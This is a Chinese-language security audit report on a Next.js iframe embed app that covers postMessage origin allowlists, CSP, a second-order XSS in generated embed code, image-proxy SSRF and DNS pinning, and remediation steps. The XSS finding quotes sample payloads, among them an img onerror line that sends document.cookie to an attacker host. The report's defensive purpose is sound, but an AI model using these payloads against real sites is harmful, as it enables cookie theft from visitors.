# h2-market-embed 六维全栈安全审计报告（cc01）

- **仓库**: `h2-market-embed`（package name: `yesono-embed`）
- **分支**: `dev`
- **HEAD**: `143a88725b7397df61f55154177ca0795f9be28f`
- **审计轮次**: `cc01`
- **审计时间**: 2026-05-13
- **⚠️ 关于阶段 G**: 本仓库 basename `h2-market-embed` **不在 Lark 表「项目」字段白名单**（合法值：bridge-verify-node / c2c-oracle-node / polymarket-community-node / H2-Bridge-Contract / H2Chain-bridge / H2-staking / polymarket-api / prediction-market-service / trade-market-contracts / trade-market-server / yesono-router / h2-market / c2c-bk），用户已确认本轮**只产出本地报告，跳过 Lark 录入**。后续需历史轮次跟踪请先到 Lark 多维表「审计」字段新增 `h2-market-embed` 单选值。

---

## 项目画像

- **项目类型**: 前端（"YesONo Embed" —— 仅展示用，以 iframe 嵌入到宿主项目；从 h2-market 派生但**移除登录/钱包/交易**）
- **技术栈**: Next.js 16 App Router + React 19 + TypeScript + shadcn/ui + Radix Primitives + Tailwind + SWR/TanStack Query + axios + zustand；包管理 pnpm 10.33；部署 Cloudflare Pages via `@opennextjs/cloudflare`
- **暴露面**:
  - 浏览器 ↔ 宿主页面（postMessage 双向通信，承载 TOB JWT 注入）
  - 浏览器 ↔ 后端 REST（`NEXT_PUBLIC_C2C_API_BASE_URL` / `NEXT_PUBLIC_AUTH_API_URL` / `NEXT_PUBLIC_REVIEW_API_HOST`）
  - 浏览器 ↔ Cloudflare Worker 图片代理（`workers/image-proxy`，与 h2-market 共用同一实现）
  - 浏览器 ↔ OrderBook WebSocket（`wss://ploutos-bundler.bitassetchain.io/ws`）
  - TOB Auth 校验 `/api/tob/auth/verify`（直连，不走 axios 拦截器）
- **关键资产**: TOB JWT / 本系统 accessToken（sessionStorage 缓存，pagehide 清理）；用户基础信息（userCode/channel/profile）；订单簿历史与市场展示数据（只读）。**无钱包私钥、无交易签名能力**。
- **信任边界**:
  1. iframe ↔ 父页（postMessage，origin 严格白名单）
  2. iframe ↔ 后端（axios `Authorization: Bearer <token>` 注入；token 来自父页 verify 结果）
  3. iframe ↔ Cloudflare Worker 图片代理（host 白名单 + IPv4/IPv6 SSRF 防护）
- **部署形态**: Cloudflare Workers via OpenNext；环境变量单一来源为 `wrangler.jsonc`；CI 自动部署（push `main` → prod，push `dev` → dev）。无 Sentry/Telemetry（[lib/sentryClient.ts](lib/sentryClient.ts) 为 no-op stub）。

---

## 🔴 Critical

#### C-01｜生产 wrangler.jsonc 顶层 `NEXT_PUBLIC_EMBED_FRAME_ANCESTORS=*` 同时复用为 CSP frame-ancestors + 父页 origin 白名单 → 生产环境 token 注入流程不工作

- **严重度**: 🔴 Critical
- **优先级**: P0
- **位置**: [wrangler.jsonc:42](wrangler.jsonc#L42), [lib/embed/config.ts:13-35](lib/embed/config.ts#L13-L35), [middleware.ts:3-12](middleware.ts#L3-L12), [next.config.js:4-37](next.config.js#L4-L37)
- **维度**: 📋 业务逻辑
- **攻击场景**:
  生产 `wrangler.jsonc` 顶层 `vars.NEXT_PUBLIC_EMBED_FRAME_ANCESTORS` 配为 `"*"`，这是双重用途的 env：
  1. **CSP `frame-ancestors`**：在 `middleware.ts:9-12` 与 `next.config.js:30-32` 都拼出 `Content-Security-Policy: frame-ancestors *` —— 任意域名可 iframe。
  2. **父页 origin 白名单**（[lib/embed/config.ts:13-35](lib/embed/config.ts#L13-L35)）：`parseOriginsFromEnv()` 在 `NEXT_PUBLIC_EMBED_ALLOWED_PARENT_ORIGINS` 缺失时回退读 `NEXT_PUBLIC_EMBED_FRAME_ANCESTORS`，但 line 23 显式 `.filter((s) => s.length > 0 && s !== "*")` —— **`*` 被过滤**，导致 `ALLOWED_PARENT_ORIGINS = []`。
  3. `isParentOriginAllowed`（line 48-75）在生产（`IS_DEV=false`）且 allowlist 空时，**fail-closed 全部返回 false**。
  4. 后果：父页发出的 `embed:auth` postMessage 全部被 bridge.onMessage 拒绝 → `verifyTobAuth` 永远不会被触发 → 子页 `status` 永远停留 `"ready"`，**token 注入流程在生产环境完全不工作**。
  5. 同时 frame-ancestors `*` 让攻击者域可以 iframe 这个站点 —— 虽然 display-only 没签名风险，但攻击者站点可以接收子页 `embed:ready / embed:resize / embed:nav` 消息（这些在 ready 阶段用 `targetOriginForSend` 走 `*`，见 M-01），可用作 UI 监视 / clickjacking 表面。
  这是 **fail-closed 安全配置 + 生产功能不可用** 的混合 bug，优先级最高。
- **修复建议**:
  1. 把 `NEXT_PUBLIC_EMBED_FRAME_ANCESTORS` 和 `NEXT_PUBLIC_EMBED_ALLOWED_PARENT_ORIGINS` 分开配置：
     ```jsonc
     // wrangler.jsonc 顶层 vars
     "NEXT_PUBLIC_EMBED_FRAME_ANCESTORS": "https://host1.partner.com https://host2.partner.com",
     "NEXT_PUBLIC_EMBED_ALLOWED_PARENT_ORIGINS": "https://host1.partner.com https://host2.partner.com"
     ```
  2. 若上线初期还没有合作伙伴名单，至少要保证两个 env 同时被显式配为同一 allowlist（而不是 `*`）。
  3. 在 `EmbedProvider` 启动时打告警：当 `IS_DEV=false && ALLOWED_PARENT_ORIGINS.length===0`，bridge 抛红 console.error + 上报给宿主（虽 sentry stripped，但至少 console.error 在生产保留）。
  4. middleware 增加 sanity check：若 `HOST_FRAME_ANCESTORS === "*"` 且非 dev → throw at module load，让 worker 启动就失败而非默默放过。

---

## 🟠 High

#### H-01｜generateEmbedCode 把 API 返回的 title / marketUrl / embedSrc 不转义直接插入 HTML —— 复制粘贴 embed 代码后宿主站点 XSS

- **严重度**: 🟠 High
- **优先级**: P1
- **位置**: [components/detail/EmbedModal.helpers.tsx:25-82](components/detail/EmbedModal.helpers.tsx#L25-L82)
- **维度**: 🛡️ 攻击面
- **攻击场景**:
  `generateEmbedCode` 生成一段 HTML 代码（含 `<script type="application/ld+json">` JSON-LD 块 + `<figure>` + `<iframe>` + `<a>`），让用户复制到自己站点。代码中：
  - `${safeTitle}` 仅做了 `title.replace(/"/g, '\\"')`（line 37）—— 只转义双引号，不转义 `<`、`>`、`&`。
  - `${marketUrl}` / `${embedSrc}` / `${siteOrigin}` / `${marketSlug}` —— 完全不转义。
  - `${title}` 在 line 75 直接作为 HTML 文本内容插入，未转义。

  攻击链：
  1. 攻击者通过 API 创建一个市场，标题填 `</script><script>alert(1)</script><script type="application/ld+json">{`；或简单地用 `<img src=x onerror=fetch('https://attacker/'+document.cookie)>` 当 title；
  2. embed 站点的市场详情页可被任意访客访问；
  3. 用户在 embed 站打开市场详情，点击"Embed"按钮，复制生成的代码片段；
  4. 用户把代码粘贴到**自己的站点** → script 执行，访问者 cookie / 当前页面内容被外发。
  5. 即便 title 字段后端做了过滤，`marketUrl` / `embedSrc` 这些 URL 参数仍不转义；若 API 把 `marketUrl` 设为 `" onerror="alert(1)`（属性逃逸），同样可注入。
  注意：这是 **second-order XSS** —— XSS 不在 embed 站本身执行（embed 站没有 `dangerouslySetInnerHTML` 渲染该代码），而是受害者宿主站点执行。embed 站等于在"散布带毒代码"。

- **修复建议**:
  对所有插入到 HTML/属性的字段做严格 HTML / URL 转义：
  ```ts
  function escapeHtml(s: string): string {
    return s
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  }
  function escapeAttrUrl(s: string): string {
    // 只允许 http(s)，其它返回空字符串占位
    try {
      const u = new URL(s);
      if (u.protocol !== 'https:' && u.protocol !== 'http:') return '';
      return u.toString().replace(/"/g, '&quot;');
    } catch { return ''; }
  }

  const safeTitle = escapeHtml(title);
  const safeMarketUrl = escapeAttrUrl(marketUrl);
  const safeEmbedSrc = escapeAttrUrl(embedSrc);
  const safeSiteOrigin = escapeAttrUrl(siteOrigin);
  const safeSlug = escapeHtml(marketSlug);
  const safeYesPrice = Number(yesPrice); // 强转数字，丢掉任何字符串攻击
  // JSON-LD 内部用 JSON.stringify 而非字符串拼接
  const jsonLd = JSON.stringify({
    "@context": "https://schema.org",
    "@type": "WebPage",
    name: title, // JSON.stringify 自己转义
    description: `Prediction market: Yes ${Number(yesPrice)}%${Number(noPrice) ? ` · No ${Number(noPrice)}%` : ""} on YesONo.`,
    url: marketUrl,
    publisher: { "@type": "Organization", name: "YesONo", url: siteOrigin },
  });
  return `<script type="application/ld+json">${jsonLd}</script>...`;
  ```
  并加单元测试：title 含 `<script>` / `"` / `'` / `</script>` 均不产生可执行 HTML。

---

#### H-02｜image-proxy Worker 仍不 pin DNS（与 h2-market 同款问题）—— 白名单域被劫持即可穿透到攻击者服务器

- **严重度**: 🟠 High
- **优先级**: P1
- **位置**: [workers/image-proxy/src/index.ts:152-219](workers/image-proxy/src/index.ts#L152-L219)
- **维度**: 🛡️ 攻击面
- **攻击场景**:
  与 h2-market 的 image-proxy 完全相同（`diff` 输出为空）：
  - IPv4 / IPv6 内网封锁完备（`isBlockedIpv4` + `isBlockedIpv6` 覆盖 RFC1918、回环、链路本地、ULA、组播、NAT64、IPv4-mapped 等）；
  - host 白名单（`isAllowedImageHost`）；
  - cross-host redirect 拒绝；
  - SVG 屏蔽 + set-cookie 剥离。

  但 `parseUpstreamUrl` 只做字符串级 hostname 匹配，`fetch(currentUrl.toString())` 实时解析 DNS。白名单中的某个域（`polymarket-upload.s3...`、`cryptologos.cc` 等）一旦被接管或 DNS 被劫持，Worker 会带着 `User-Agent: yesono-image-proxy/1.1` 连到攻击者。
- **修复建议**:
  与 h2-market cc04 M-02 同款修复方案，建议两个仓库 image-proxy 同步治理：
  1. 把允许名单收紧到项目方自控 CDN（`cdn.bitassetchain.io`、`r2.h2inno.com`），第三方 logo 全部转存到自己的 R2 bucket；
  2. 或者在 Worker 中做 DNS over HTTPS 预解析，验证 A/AAAA 非私网后把 host 替换为 IP + `Host:` header 发出。

---

## 🟡 Medium

#### M-01｜bridge.targetOriginForSend 在 ready / pre-trust 阶段对未推断到的 origin fallback `"*"` —— 子页 ready 消息含 path / href，可被任意 iframe 父页接收

- **严重度**: 🟡 Medium
- **优先级**: P2
- **位置**: [lib/embed/bridge.ts:88-95](lib/embed/bridge.ts#L88-L95), [lib/embed/IframeBridge.tsx:30-39](lib/embed/IframeBridge.tsx#L30-L39)
- **维度**: 🛡️ 攻击面
- **攻击场景**:
  在 `trustedParentOrigin` 锁定之前，`targetOriginForSend()`：
  1. 看 `inferReferrerOrigin()` + `isParentOriginAllowed(ref)`；
  2. 若推断不到或不在白名单 → 返回 `"*"`。

  这意味着子页挂载时主动 send 的 `embed:ready` 消息（含 `path` / `href` / `protocolVersion`）会以 `targetOrigin="*"` 发出 —— **任意 iframe 父页都能接收**。即便父页 origin 不在白名单（C-01 的生产场景），ready 消息仍然外发。攻击者可：
  - 用任意域 iframe `https://embed.yesono.trade/market/<id>`，监听 ready 消息得知用户访问了哪个市场（`href` 含完整 URL，可能带查询参数）；
  - 后续 IframeBridge 还会发 `embed:resize` / `embed:nav` —— 也是 `"*"` 发出（因为 trusted 未锁定时仍走 fallback）。

  虽然这些消息不含 token，但可作为侦察 / 跟踪手段，违反"最小披露"原则。
- **修复建议**:
  1. ready 阶段对未知 origin 不主动发 ready，而是**等 parent 先发 `embed:ping`**，从消息中拿 origin 锁定后再回 ready：
     ```ts
     // 改为：parent 必须先 ping，我们才 ready
     bridge.on(ParentMsgType.Ping, () => {
       // origin 已经在 onMessage 锁定了 trustedParentOrigin
       bridge.send({ type: ChildMsgType.Ready, ... });
     });
     ```
  2. 或者：保留主动 ready，但加 `?parentOrigin=` URL 参数 + 校验是否在 ALLOWED_PARENT_ORIGINS，若都不行就**不发** ready 而非用 `"*"`。
  3. 至少不要把 `href`（含 query string）放进 ready 消息 —— path 已经够用。

---

#### M-02｜父页 origin 白名单复用 `NEXT_PUBLIC_EMBED_FRAME_ANCESTORS` 但 `*` 被静默过滤 —— 配置陷阱

- **严重度**: 🟡 Medium
- **优先级**: P2
- **位置**: [lib/embed/config.ts:13-35](lib/embed/config.ts#L13-L35)
- **维度**: 🎯 Footgun
- **攻击场景**:
  `parseOriginsFromEnv` 在没有 `NEXT_PUBLIC_EMBED_ALLOWED_PARENT_ORIGINS` 时回退读 `NEXT_PUBLIC_EMBED_FRAME_ANCESTORS`，但又 `.filter((s) => s !== "*")` —— 一种典型的"两个不同语义的 env 复用同一个 env 名"陷阱：
  - 配 `frame-ancestors: *`（任意域 iframe）+ origin allowlist 自动空（fail-closed）—— 自相矛盾的语义；
  - 维护者改 `NEXT_PUBLIC_EMBED_FRAME_ANCESTORS` 时不会想到自己也在改 postMessage 父页白名单；
  - C-01 的生产 token 不通就是这个陷阱触发的最严重后果。
- **修复建议**:
  彻底分离两个 env：
  ```ts
  // lib/embed/config.ts
  function parseOriginsFromEnv(): string[] {
    const raw = process.env.NEXT_PUBLIC_EMBED_ALLOWED_PARENT_ORIGINS || "";
    // 不再 fallback 到 frame-ancestors —— 两者语义完全不同
    return raw.split(/[\s,]+/).map(s => s.trim()).filter(s => s && s !== "*")
      .map(s => { try { const u = new URL(s); return `${u.protocol}//${u.host}`; } catch { return s; } });
  }
  ```
  `frame-ancestors` 决定 "哪些域可以 iframe 你"，`allowed-parent-origins` 决定 "哪些 origin 的 postMessage 你信任"。前者可以宽松（display-only 内容可被任意域嵌），后者必须严格（token 注入的信任来源）。

---

#### M-03｜postcss 8.4.31（next 16 内置传递依赖）中 CVE-2026-41305 XSS via Unescaped `</style>`（pnpm audit 唯一一项）

- **严重度**: 🟡 Medium
- **优先级**: P2
- **位置**: [package.json:21](package.json#L21)（间接：next → postcss）
- **维度**: 🔗 供应链
- **攻击场景**:
  `pnpm audit --prod` 报告 1 项 moderate（CVSS 6.1）：postcss 8.4.31 经由 `next` 拉入。CVE-2026-41305 描述：postcss 在 stringify CSS AST 时不转义 `</style>`，若调用方将用户 CSS 解析后再嵌入 HTML `<style>`，可被 `"</style><script>...</script>"` 攻击。

  本项目用 postcss 主要走 Tailwind 构建期处理，**构建期 PostCSS 不可被攻击者注入用户 CSS**（用户没有上传 CSS 的能力），所以**不直接命中**。但：
  1. 依赖图里挂着已知 XSS 是合规问题；
  2. 未来若有人引入 `react-syntax-highlighter` 类运行时 CSS 解析，立刻命中。
- **修复建议**:
  pnpm 的 overrides 钉一下版本：
  ```jsonc
  "pnpm": {
    "overrides": {
      "lucide-react": "0.469.0",
      "postcss": "^8.5.10"
    }
  }
  ```
  跑一次 `pnpm install` 后 `pnpm audit --prod` 应该清零。

---

#### M-04｜axios 错误日志路径（getSafeUrl）仅剥 query，未脱敏其它敏感字段，且 lib/sentryClient.ts 是 no-op —— 排障日志依赖 console.error 在 Cloudflare logs 散播

- **严重度**: 🟡 Medium
- **优先级**: P2
- **位置**: [lib/request.ts:48-65](lib/request.ts#L48-L65), [lib/request.ts:170-178](lib/request.ts#L170-L178), [lib/sentryClient.ts:1-3](lib/sentryClient.ts#L1-L3)
- **维度**: 🔒 认证授权
- **攻击场景**:
  `getSafeUrl` 仅剥 query string 不动 path，path 中的 ID（如 `/api/users/<userId>/balance`）会在日志里完整保留。`captureApiException` 调 `captureException`，但本仓库 [lib/sentryClient.ts](lib/sentryClient.ts) 整体是 no-op stub —— 日志只剩 `console.error`，由 Cloudflare Workers `observability` (`head_sampling_rate: 1`) 全量采样到 Cloudflare 日志面板。

  风险：
  1. URL path 含 userId / marketId 等敏感标识 → Cloudflare 日志中央存储；
  2. wrangler.jsonc 顶层 `"observability": { "enabled": true, "head_sampling_rate": 1 }`，意味着 **100% 请求被采** —— 若日志通过 Logpush 推到第三方 SIEM/S3，等同于全量泄露请求路径。
- **修复建议**:
  1. `getSafeUrl` 把 path 中的数字 / hex 段也做归一化：
     ```ts
     function getSafeUrl(rawUrl?: string): string {
       if (!rawUrl) return 'unknown';
       try {
         const p = new URL(rawUrl, typeof window !== 'undefined' ? window.location.origin : 'http://x').pathname;
         return p
           .replace(/0x[a-fA-F0-9]{40,}/g, ':addr')
           .replace(/\d{6,}/g, ':id')
           .replace(/[a-f0-9-]{32,}/g, ':hash');
       } catch { return 'unknown'; }
     }
     ```
  2. `head_sampling_rate: 1` 降到 `0.1`（10% 采样足以排障），生产环境再加 Cloudflare Logpush 的字段过滤；
  3. 即便 sentry 是 stub，也建议保留 `captureException` 调用链，未来宿主重新接入可立即生效。

---

## 🔵 Low

#### L-01｜tobAuth.ts 不开 withCredentials 但后端可能在响应里下发 `Set-Cookie`，子页虽不会带，但跨域响应里残留可能误导排查

- **严重度**: 🔵 Low
- **优先级**: P3
- **位置**: [lib/embed/tobAuth.ts:55-65](lib/embed/tobAuth.ts#L55-L65)
- **维度**: 🔒 认证授权
- **攻击场景**:
  注释明确："`withCredentials: false` 避免 3PC 拦截"。但响应里如果带 `Set-Cookie: refreshToken=...`，浏览器在 `credentials: 'omit'` 下不会落盘，但 cookie 值会出现在 Network 面板。这不是漏洞，只是个微弱的混淆点。
- **修复建议**:
  在 tobAuth.ts 注释里加一行"后端 `/api/tob/auth/verify` 响应应**不**带 Set-Cookie"，并和后端约定为契约；同时 axios `validateStatus` 不要 follow 200 之外的状态（已经默认行为）。

---

#### L-02｜?token= 仍在 dev 模式启用，console.warn 不阻断流程

- **严重度**: 🔵 Low
- **优先级**: P3
- **位置**: [lib/embed/EmbedContext.tsx:330-342](lib/embed/EmbedContext.tsx#L330-L342)
- **维度**: 🎯 Footgun
- **攻击场景**:
  `?token=` 仅在 `process.env.NODE_ENV !== "production"` 启用 —— 生产已关闭。但 dev 环境下仍能用，且只 `console.warn`，不阻断。Dev 环境的 `pnpm dev` 默认监听 0.0.0.0:3000（Next 默认绑所有接口），同网段攻击者可访问 `http://<dev-host>:3000/?token=<stolen>` 把自己塞进 dev session。
  风险范围有限（仅 dev），但建议彻底删除该旁路。
- **修复建议**:
  把整个 useEffect 删掉：
  ```ts
  // 移除 line 330-342 的 ?token= 旁路。dev 环境调试请用 mock-parent.html iframe 模拟。
  ```
  改用 `lib/embed/mock-parent.html`（已有 mock 工具）做本地联调，避免在生产代码里留旁路。

---

#### L-03｜wrangler.jsonc dev 环境 `NEXT_PUBLIC_TOB_API_BASE_URL=http://38w704731p.qicp.vip` 是明文 HTTP

- **严重度**: 🔵 Low
- **优先级**: P3
- **位置**: [wrangler.jsonc:62](wrangler.jsonc#L62)
- **维度**: 🛡️ 攻击面
- **攻击场景**:
  dev 环境的 TOB Auth 端点是 `http://` 明文。dev 通常不会有真实用户，但 dev 自身也部署到 Cloudflare Workers，能被任意访客打开。在 dev 上做 verify 时 channel JWT + 用户信息明文传输，可被中间人截获。
- **修复建议**:
  即便是 dev，也部署一份 TLS 域名再切换，或用 HTTPS 代理穿透。仓库内不应出现 `http://` 业务接口。

---

#### L-04｜lib/embed/EmbedContext applyLocale / applyTheme 用 document.cookie 写 Cookie，但 cookie SameSite=Lax 在 iframe 跨站场景大多数浏览器仍写不进 —— 静默无效

- **严重度**: 🔵 Low
- **优先级**: P3
- **位置**: [lib/embed/EmbedContext.tsx:380-405](lib/embed/EmbedContext.tsx#L380-L405)
- **维度**: 🎯 Footgun
- **攻击场景**:
  applyLocale / applyTheme 使用 `document.cookie = "...; SameSite=Lax"`。在 iframe 跨站场景，Chrome 默认 SameSite=Lax 等于"未声明 SameSite 时是 Lax"，第三方 cookie 仍可能被拒（取决于浏览器 3PC 策略）。这意味着用户切换 locale/theme 后下次 SSR 拿到的 cookie 可能没更新，导致 SSR 渲染语言/主题与客户端不一致（轻微 UX 问题，不是安全问题）。
- **修复建议**:
  iframe embed 场景下不要依赖 cookie 持久化 locale/theme。改用：
  1. localStorage（同源即可，不受 3PC 影响）；
  2. 或者每次都靠 `embed:locale-change` / `embed:theme-change` 父页下发，子页内存即可。

---

## ⚪ Info

#### I-01｜bridge 设计良好（origin 严格白名单 + source==window.parent 校验 + 锁定 trustedParentOrigin 后不再变更）

- **严重度**: ⚪ Info
- **优先级**: P3
- **位置**: [lib/embed/bridge.ts:117-182](lib/embed/bridge.ts#L117-L182)
- **维度**: 🛡️ 攻击面
- **攻击场景**:
  `onMessage` 处理顺序：① data 形状校验 → ② `isParentOriginAllowed` → ③ `ev.source !== window.parent` 拒绝（防嵌套 iframe 伪造）→ ④ 协议版本宽容处理 → ⑤ 锁定 trustedParentOrigin；之后任何 origin 与 lock 值不符立刻拒。
- **修复建议**: 保持。

---

#### I-02｜tobAuth.ts 显式不开 withCredentials；refresh 流程通过 parent `embed:token-refresh` 推动，不依赖 3PC

- **严重度**: ⚪ Info
- **优先级**: P3
- **位置**: [lib/embed/tobAuth.ts:55-65](lib/embed/tobAuth.ts#L55-L65)
- **维度**: 🔒 认证授权
- **攻击场景**: 顶部注释清楚解释为什么不开 withCredentials（CORS `*` 与 credentials 不兼容、Chrome 3PC / Safari ITP），refresh 设计走父页重新下发 channel JWT。架构在跨站 iframe 场景下逻辑自洽。
- **修复建议**: 保持。

---

#### I-03｜token 仅缓存在 sessionStorage，pagehide 时清理；不写 localStorage

- **严重度**: ⚪ Info
- **优先级**: P3
- **位置**: [lib/embed/EmbedContext.tsx:99-129](lib/embed/EmbedContext.tsx#L99-L129), [lib/embed/EmbedContext.tsx:315-323](lib/embed/EmbedContext.tsx#L315-L323)
- **维度**: 🔒 认证授权
- **攻击场景**: tab 关闭即清；XSS 可读窗口缩到 tab 生命周期内；不会跨 tab 泄露。
- **修复建议**: 保持。

---

#### I-04｜dangerouslySetInnerHTML 使用场景均为静态 CSS 字符串（glowStyles）

- **严重度**: ⚪ Info
- **优先级**: P3
- **位置**: [app/crypto/[id]/CryptoOutcomeGraph.tsx:200](app/crypto/%5Bid%5D/CryptoOutcomeGraph.tsx#L200), [app/market/[id]/outcome/[outcomeIndex]/OutcomeProbabilityChart.tsx:231](app/market/%5Bid%5D/outcome/%5BoutcomeIndex%5D/OutcomeProbabilityChart.tsx#L231), [components/ProbabilityChart.tsx:258](components/ProbabilityChart.tsx#L258), [components/sports/GamesView/SportsOutcomeGraph.tsx:301](components/sports/GamesView/SportsOutcomeGraph.tsx#L301), [components/detail/OutcomeGraph.tsx:428](components/detail/OutcomeGraph.tsx#L428), [components/detail/MarketChartView.tsx:534](components/detail/MarketChartView.tsx#L534)
- **维度**: 🛡️ 攻击面
- **攻击场景**: 全是 `<style dangerouslySetInnerHTML={{ __html: glowStyles }} />`，glowStyles 是模块常量。OutcomeGraph / MarketChartView 注释明确"Avoid innerHTML injection: build DOM nodes + textContent" —— 团队有意识。
- **修复建议**: 保持。注意 H-01 的 generateEmbedCode 不是 innerHTML 路径而是"产出 HTML 文本给用户复制"，需要单独修。

---

#### I-05｜Sentry / Telemetry 整体 stripped（lib/sentryClient.ts 全 no-op），不存在第三方上报 PII 风险

- **严重度**: ⚪ Info
- **优先级**: P3
- **位置**: [lib/sentryClient.ts:1-3](lib/sentryClient.ts#L1-L3)
- **维度**: 🔒 认证授权
- **攻击场景**: 文件顶部明确："The embedded build does not ship Sentry — the host project is expected to instrument errors." 所有导出函数（identify / addBreadcrumb / captureException / startUserActiveSpan / openLoginModalWithTrack ...）均为 no-op。
- **修复建议**: 保持。当宿主项目自己接 Sentry 时，可考虑通过 `embed:metric` 消息把关键错误外发给父页。

---

#### I-06｜removeConsole 生产保留 error，开发保留全部

- **严重度**: ⚪ Info
- **优先级**: P3
- **位置**: [next.config.js:13-15](next.config.js#L13-L15)
- **维度**: 🔒 认证授权
- **攻击场景**: 生产 build 仅保留 `console.error`，其它 console 调用被 SWC 删除，避免 token / 业务数据落浏览器 console。但与 M-04 配合看：保留的 `console.error` 会落 Cloudflare 日志面板（observability head_sampling_rate=1）。
- **修复建议**: 保持。结合 M-04 治理 Cloudflare 采样率。

---

#### I-07｜image-proxy IPv4 / IPv6 SSRF 防护完备（与 h2-market 同款实现）

- **严重度**: ⚪ Info
- **优先级**: P3
- **位置**: [workers/image-proxy/src/index.ts:241-327](workers/image-proxy/src/index.ts#L241-L327)
- **维度**: 🛡️ 攻击面
- **攻击场景**: 覆盖 RFC1918 / 链路本地 / 169.254.169.254 / IPv6 ULA `fc00::/7` / 链路本地 `fe80::/10` / 组播 `ff00::/8` / IPv4-mapped `::ffff:` / NAT64 `64:ff9b::/96` / 文档保留 `2001:db8::/32` 等危险段。
- **修复建议**: 保持，DNS pinning 见 H-02。

---

#### I-08｜?token= 旁路仅在 dev 启用（NODE_ENV !== "production"）；生产严格走 postMessage

- **严重度**: ⚪ Info
- **优先级**: P3
- **位置**: [lib/embed/EmbedContext.tsx:330-342](lib/embed/EmbedContext.tsx#L330-L342)
- **维度**: 🔒 认证授权
- **攻击场景**: `pnpm deploy[:dev]` 走 [scripts/deploy.sh](scripts/deploy.sh) 显式 `export NODE_ENV=production`，OpenNext build 期 baked-in，所以即便 dev 部署的 worker，运行时 `NODE_ENV` 也是 production，?token= 旁路也被关。本地 `pnpm dev` 才能用。
- **修复建议**: 保持（治理彻底删除见 L-02）。

---

#### I-09｜axios 401 自动续期 + authQueue 去重 + `__embedAuthRetried` 标记防止无限循环

- **严重度**: ⚪ Info
- **优先级**: P3
- **位置**: [lib/request.ts:184-205](lib/request.ts#L184-L205)
- **维度**: 🎯 Footgun
- **攻击场景**: response 拦截器对 401 触发 `requestEmbedAuthRefresh("expired")`，并标记 `__embedAuthRetried = true` 后重放 —— 最多一次重试。`authQueue.waitForRefresh()` 让多个并发 401 共享一次刷新流程。设计良好。
- **修复建议**: 保持。

---

## 测试完备性

- **零测试覆盖**：仓库无 `__tests__/`，无 `vitest.config.ts`，CLAUDE.md 明写 "No tests configured"。`package.json scripts` 只有 `dev/build/lint/deploy/prepare`。
- **关键路径全部裸奔**：
  - bridge.onMessage 的 origin / source / version 校验（C-01、I-01 涉及）；
  - tobAuth verify 的成功 / 失败 / 429 重试 / mock 路径；
  - request 拦截器 401 重放 + authQueue 去重；
  - EmbedContext.token 失效续期流程（FR-2.4 临近过期主动告父页）；
  - generateEmbedCode 的 XSS 转义（H-01）—— 没有测试保护，一旦 fix 后维护者很容易把 escapeHtml 改回原始拼接。
- **建议最少补**：
  ```ts
  // __tests__/embed/bridge.test.ts
  it('rejects message from non-allowlisted origin', () => { ... });
  it('rejects message when ev.source !== window.parent', () => { ... });
  it('locks trustedParentOrigin after first valid message', () => { ... });

  // __tests__/embed/tobAuth.test.ts
  it('throws TobAuthError 401 when channelToken is empty', () => { ... });
  it('returns mock accessToken when NEXT_PUBLIC_TOB_USE_MOCK=1', () => { ... });

  // __tests__/components/EmbedModal.helpers.test.ts
  it('escapes <script> in title', () => {
    const code = generateEmbedCode({ title: '</script><script>alert(1)</script>', ...});
    expect(code).not.toMatch(/<script>alert\(1\)<\/script>/);
  });

  // __tests__/request.test.ts
  it('retries once with new token on 401', () => { ... });
  it('does not retry twice on 401', () => { ... });
  ```
  本地装 vitest（`pnpm add -D vitest @vitest/coverage-v8`）+ `"test": "vitest run"` 脚本，CI 加 `pnpm test` 步骤。

---

## 八维覆盖总览

| 维度 | 覆盖情况 | 关键发现 |
| --- | --- | --- |
| 🛡️ 攻击面 | 深度 | C-01 配置陷阱（frame-ancestors 与 origin allowlist 同源）、H-01 generateEmbedCode XSS、M-01 ready 阶段 targetOrigin "*"、H-02 image-proxy DNS 不 pin |
| 💰 资金 | 无（embed 已剥离钱包 / 交易 / 签名能力） | I-05 sentry stripped，不外发 PII |
| 📋 业务逻辑 | 深度 | C-01 生产 token 注入流程死锁 |
| 🔗 供应链 | 浅（pnpm audit 仅 1 moderate） | M-03 postcss 8.4.31 CVE-2026-41305（间接依赖，未直接命中） |
| 🎯 Footgun | 深度 | M-02 env 双语义复用、L-02 dev ?token= 旁路、L-04 cookie 3PC、I-09 401 重放 |
| 🔒 认证 / 会话 / 密钥 | 深度 | C-01 token 注入流程；I-02 tobAuth 不开 credentials；I-03 sessionStorage + pagehide 清理 |
| 🧪 测试 | 无 | 关键 bridge / verify / request / generateEmbedCode 路径无测试 |
| 🏗️ 基础设施 | 中（wrangler.jsonc 单一来源） | C-01 wrangler vars 配置导致生产功能死锁；M-04 observability head_sampling_rate=1 全量采样 |

---

## 阶段 G｜跳过说明

本仓库 basename `h2-market-embed` 不在 Lark 表「项目」字段白名单（合法值见报告头部）。按命令的硬性前置约束，`audit-postprocess.mjs` 会拒绝写表。

用户已选择"只产出本地报告，跳过 Lark 录入"。

**未来若要跟踪本项目的轮次进展**：先到 Lark 多维表对应字段加 `h2-market-embed` 单选值，再跑：
```bash
node ~/.claude/scripts/audit-postprocess.mjs \
  --project "h2-market-embed" \
  --suffix "cc01" \
  --report "/Users/luo/workspace/审计/h2-market-embed-cc01.md"
```
即可补录历史 + 后续 cc02/cc03 自动启用对账流。
